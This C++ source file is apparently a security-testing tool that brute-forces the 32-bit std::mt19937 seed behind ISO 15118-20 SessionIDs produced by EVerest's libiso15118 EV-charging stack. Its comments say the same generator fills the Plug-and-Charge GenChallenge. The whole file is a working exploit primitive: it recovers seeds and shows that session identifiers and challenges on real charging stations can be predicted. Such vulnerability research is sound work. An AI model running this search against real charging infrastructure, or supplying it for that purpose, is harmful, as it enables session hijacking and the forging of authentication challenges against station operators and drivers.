// Recover the 32-bit std::mt19937 seed behind an ISO 15118-20 SessionID that EVerest's
// libiso15118 put on the wire.
//
// Their d20::Session constructor (lib/everest/iso15118/src/iso15118/d20/session.cpp) fills
// the 8-byte SessionID like this, and their AuthorizationSetup fills the 16-byte PnC
// GenChallenge with the same five lines:
//
//     std::random_device rd;
//     std::mt19937 generator(rd());
//     std::uniform_int_distribution<uint8_t> distribution(0x00, 0xff);
//     for (auto& item : id) { item = distribution(generator); }
//
// std::mt19937's scalar constructor takes ONE 32-bit seed, so however long the array is,
// its contents are a pure function of 32 bits. This walks all 2^32 of them and reports
// which of the given SessionIDs it reproduces.
//
// The generator lines are copied verbatim from theirs rather than modelled, and this is
// built with the same libstdc++ that built the station under test — so a recovered seed is
// a statement about their binary, not about our reading of their source.
//
//     g++ -O3 -march=native -pthread -o seedsearch seedsearch.cpp
//     ./seedsearch targets.txt            # one 16-hex-digit SessionID per line
//     ./seedsearch --bench                # single-thread throughput, to size the run
//
// Exit code is 0 when every target was recovered, 1 otherwise — so a toolchain whose
// std::uniform_int_distribution differs from the station's fails loudly instead of
// quietly reporting "not found", which would look exactly like a strong RNG.

#include <algorithm>
#include <array>
#include <atomic>
#include <chrono>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <fstream>
#include <mutex>
#include <random>
#include <string>
#include <thread>
#include <unordered_map>
#include <vector>

namespace {

constexpr std::size_t SESSION_ID_LENGTH = 8; // their common_types.hpp

// Their five lines, unchanged. Returns the SessionID packed big-endian, id[0] first,
// which is the order the bytes appear in the V2G message header.
std::uint64_t session_id_for_seed(std::uint32_t seed) {
    std::mt19937 generator(seed);
    std::uniform_int_distribution<std::uint8_t> distribution(0x00, 0xff);

    std::array<std::uint8_t, SESSION_ID_LENGTH> id{};
    for (auto& item : id) {
        item = distribution(generator);
    }

    std::uint64_t packed = 0;
    for (auto byte : id) {
        packed = (packed << 8) | byte;
    }
    return packed;
}

void bench() {
    const auto start = std::chrono::steady_clock::now();
    constexpr std::uint32_t N = 200000;
    std::uint64_t sink = 0;
    for (std::uint32_t s = 0; s < N; ++s) {
        sink ^= session_id_for_seed(s);
    }
    const auto secs = std::chrono::duration<double>(std::chrono::steady_clock::now() - start).count();
    const double per_seed_us = secs * 1e6 / N;
    std::printf("%.3f us/seed single-threaded  ->  2^32 seeds = %.1f core-minutes  (sink %016llx)\n",
                per_seed_us, per_seed_us * 4294967296.0 / 60e6, (unsigned long long)sink);
}

} // namespace

int main(int argc, char** argv) {
    if (argc >= 2 && std::strcmp(argv[1], "--bench") == 0) {
        bench();
        return 0;
    }
    if (argc < 2) {
        std::fprintf(stderr, "usage: seedsearch <targets.txt> | --bench\n");
        return 2;
    }

    // targets: one 16-hex-digit SessionID per line, '#' comments and blanks ignored
    std::unordered_map<std::uint64_t, std::string> targets;
    {
        std::ifstream in(argv[1]);
        if (!in) {
            std::fprintf(stderr, "cannot read %s\n", argv[1]);
            return 2;
        }
        std::string line;
        while (std::getline(in, line)) {
            line.erase(std::remove_if(line.begin(), line.end(),
                                      [](unsigned char c) { return std::isspace(c) || c == ',' || c == ':'; }),
                       line.end());
            if (line.empty() || line[0] == '#') {
                continue;
            }
            if (line.size() != 16) {
                std::fprintf(stderr, "skipping %-20s (not 16 hex digits)\n", line.c_str());
                continue;
            }
            targets.emplace(std::stoull(line, nullptr, 16), line);
        }
    }
    if (targets.empty()) {
        std::fprintf(stderr, "no targets\n");
        return 2;
    }
    std::printf("searching all 2^32 mt19937 seeds for %zu SessionID(s)\n", targets.size());

    const unsigned threads = std::max(1u, std::thread::hardware_concurrency());
    std::printf("threads: %u\n", threads);
    std::fflush(stdout);

    std::mutex hit_lock;
    std::vector<std::pair<std::string, std::uint32_t>> hits;
    std::atomic<std::uint64_t> done{0};
    const auto start = std::chrono::steady_clock::now();

    std::vector<std::thread> pool;
    for (unsigned t = 0; t < threads; ++t) {
        pool.emplace_back([&, t] {
            // stride the space so every thread finishes at about the same time
            for (std::uint64_t seed = t; seed <= 0xFFFFFFFFull; seed += threads) {
                const std::uint64_t id = session_id_for_seed(static_cast<std::uint32_t>(seed));
                const auto found = targets.find(id);
                if (found != targets.end()) {
                    std::lock_guard<std::mutex> guard(hit_lock);
                    hits.emplace_back(found->second, static_cast<std::uint32_t>(seed));
                    std::printf("  RECOVERED %s  <- mt19937 seed 0x%08llx\n", found->second.c_str(),
                                (unsigned long long)seed);
                    std::fflush(stdout);
                }
                if ((seed & 0xFFFFFFF) == t) {
                    done.fetch_add(0x10000000 / threads);
                }
            }
        });
    }
    for (auto& thread : pool) {
        thread.join();
    }

    const auto secs = std::chrono::duration<double>(std::chrono::steady_clock::now() - start).count();
    std::printf("\nsearched 2^32 seeds in %.1f s\n", secs);
    std::printf("recovered %zu of %zu SessionID(s)\n", hits.size(), targets.size());

    for (const auto& target : targets) {
        const bool got = std::any_of(hits.begin(), hits.end(),
                                     [&](const auto& hit) { return hit.first == target.second; });
        if (!got) {
            std::printf("  NOT FOUND %s\n", target.second.c_str());
        }
    }

    return hits.size() == targets.size() ? 0 : 1;
}
